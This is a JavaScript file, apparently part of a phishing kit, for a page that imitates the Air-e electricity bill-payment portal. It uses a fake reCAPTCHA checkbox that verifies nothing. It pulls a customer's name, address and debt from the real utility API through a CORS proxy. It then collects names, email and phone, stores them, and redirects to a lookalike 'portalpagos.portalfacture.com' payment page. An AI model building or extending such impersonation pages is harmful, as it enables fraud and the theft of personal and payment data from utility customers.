// --- 1 y 2: Lógica de Menú y ReCAPTCHA (Se mantiene igual) ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');
const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};
if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;
if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA PRINCIPAL (ADAPTADA PARA HOSTING) ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        if(!inputNic || inputNic.value.trim() === '') {
            alert("Por favor, ingrese el NIC.");
            return;
        }
        if(!isChecked) {
            alert("Por favor confirme que no es un robot.");
            return;
        }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div><p>Consultando deuda...</p></div>`;

        try {
            const nic = inputNic.value.trim();
            // URL original de la API
            const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
            
            // Usamos corsproxy.io (Codificado correctamente)
            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;

            const resp = await fetch(proxyUrl);
            if (!resp.ok) throw new Error("Error de conexión (Estado: " + resp.status + ")");

            // 1. Obtenemos la respuesta
            let data = await resp.json();
            
            // --- CORRECCIÓN CLAVE ---
            // A veces la API devuelve un JSON dentro de un String. Si 'data' es texto, lo convertimos a objeto.
            if (typeof data === 'string') {
                try {
                    data = JSON.parse(data);
                } catch (e) {
                    console.error("No se pudo parsear el string interno", e);
                }
            }

            console.log("Datos recibidos de la API:", data); // Mira la consola (F12) para ver qué llegó

            // 2. Buscamos la información (info) de forma flexible
            let info = null;

            if (data.ACCOUNTS) {
                // Caso A: Viene dentro de ACCOUNTS (Lo normal)
                info = data.ACCOUNTS;
            } else if (data.ADJUST_BALANCE) {
                // Caso B: Viene directo en la raíz (Sin ACCOUNTS)
                info = data;
            } else if (Array.isArray(data) && data.length > 0 && data[0].ADJUST_BALANCE) {
                 // Caso C: Viene dentro de un array
                 info = data[0];
            }

            // 3. Verificamos si encontramos la info
            if (!info) {
                // Si falla, mostramos qué llegó para entender el error
                alert("Respuesta recibida pero sin datos de cuenta. Ver consola para detalles.");
                console.log("Estructura desconocida:", data);
                throw new Error("No se encontraron datos para este NIC.");
            }

            // --- DE AQUÍ EN ADELANTE ES TU CÓDIGO NORMAL ---
            const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
            
            let valorMesNum = 0;
            if (info.INVOICES && info.INVOICES.length > 0) {
                valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
            }
            
            // IMPORTANTE: Asegúrate de usar 'data.NAME' o 'info.NAME' según corresponda
            // Si 'data.NAME' no existe, intentamos buscarlo dentro de 'info'
            const nombreUsuario = data.NAME || info.NAME || "Usuario Air-e";

            if (deudaTotalNum > 0) {
                whitePanel.innerHTML = `
                <div class="invoice-view">
                    <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
                    <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px;">
                        <strong style="display:block; color:#004a99;">${nombreUsuario}</strong>
                        <small>${info.COLLECTION_ADDRESS}</small>
                    </div>
                    <div class="invoice-form-grid">
                        <div class="required-note">* Indica campo requerido</div>
                        <div class="invoice-input-group"><label class="invoice-label">No. identificación <span>*</span></label><input type="text" class="invoice-field" id="numId" value="${nic}"></div>
                        <div class="invoice-input-group"><label class="invoice-label">Nombres <span>*</span></label><input type="text" class="invoice-field" id="nombres"></div>
                        <div class="invoice-input-group"><label class="invoice-label">Apellidos <span>*</span></label><input type="text" class="invoice-field" id="apellidos"></div>
                        <div class="invoice-input-group"><label class="invoice-label">Correo <span>*</span></label><input type="email" class="invoice-field" id="correo"></div>
                        <input type="hidden" id="tipoId" value="CC">
                        <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS}">
                        <div class="invoice-input-group"><label class="invoice-label">Celular <span>*</span></label><input type="text" class="invoice-field" id="celular"></div>
                    </div>
                    <div class="payment-cards-grid">
                        <div class="payment-card">
                            <div class="pay-card-title">Valor del mes</div>
                            <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                            <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                        </div>
                        <div class="payment-card">
                            <div class="pay-card-title">Deuda Total</div>
                            <div class="pay-card-amount">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                            <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                        </div>
                    </div>
                    <div class="invoice-footer">
                        <div class="terms-check"><input type="checkbox" id="checkTerm" checked><span>Acepto políticas de tratamiento de datos.</span></div>
                        <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
                    </div>
                </div>`;
            } else {
                alert("El NIC no presenta deudas pendientes.");
                location.reload();
            }
        } catch (e) {
            console.error(e);
            alert("Error: " + e.message);
            location.reload();
        }
    });
}

window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value;
    const ape = document.getElementById('apellidos').value;
    const mail = document.getElementById('correo').value;
    const term = document.getElementById('checkTerm');

    if(!nom || !ape || !mail) {
        alert("Complete todos los campos requeridos.");
        return;
    }
    if(!term.checked) {
        alert("Debe aceptar los términos.");
        return;
    }

    const datos = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        montoPagar: parseInt(monto),
        referencia: Math.floor(Math.random() * 1000000)
    };
    localStorage.setItem('datosFactura', JSON.stringify(datos));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
